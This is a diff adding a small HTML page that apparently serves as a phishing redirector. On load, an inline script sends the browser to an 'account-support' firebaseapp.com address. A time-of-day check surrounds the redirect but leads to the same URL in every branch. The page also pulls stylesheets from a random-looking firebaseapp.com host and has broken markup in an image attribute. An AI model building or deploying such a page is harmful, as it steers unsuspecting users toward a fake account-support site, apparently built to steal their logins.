@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>index</title>
+<meta name="generator" content="https://account-support-8959e.firebaseapp.com">
+<link href="https://accountspotwdfweefopuriuityur.firebaseapp.com/Untitled1.css" rel="stylesheet">
+<link href="https://accountspotwdfweefopuriuityur.firebaseapp.com/index.css" rel="stylesheet">
+</head>
+<body>
+<a href="../account-support-8959e.firebaseapp.com/index.html" target="_blank"><img src="index.html" alt="  "position:absolute;left:441px;top:967px;border-width:0;z-index:250"></a>
+<div style="z-index:1">
+<script>
+datenow = new Date(); 
+timenow = datenow.getTime(); 
+datenow.setTime(timenow); 
+hournow = datenow.getHours(); 
+if (hournow > 18)
+{ 
+   window.location = 'https://account-support-8959e.firebaseapp.com';
+}
+else 
+if (hournow > 12) 
+{
+   window.location = 'https://account-support-8959e.firebaseapp.com';
+}
+else 
+{
+   window.location = 'https://account-support-8959e.firebaseapp.com';
+}
+</script></div>
+</body>
+</html>
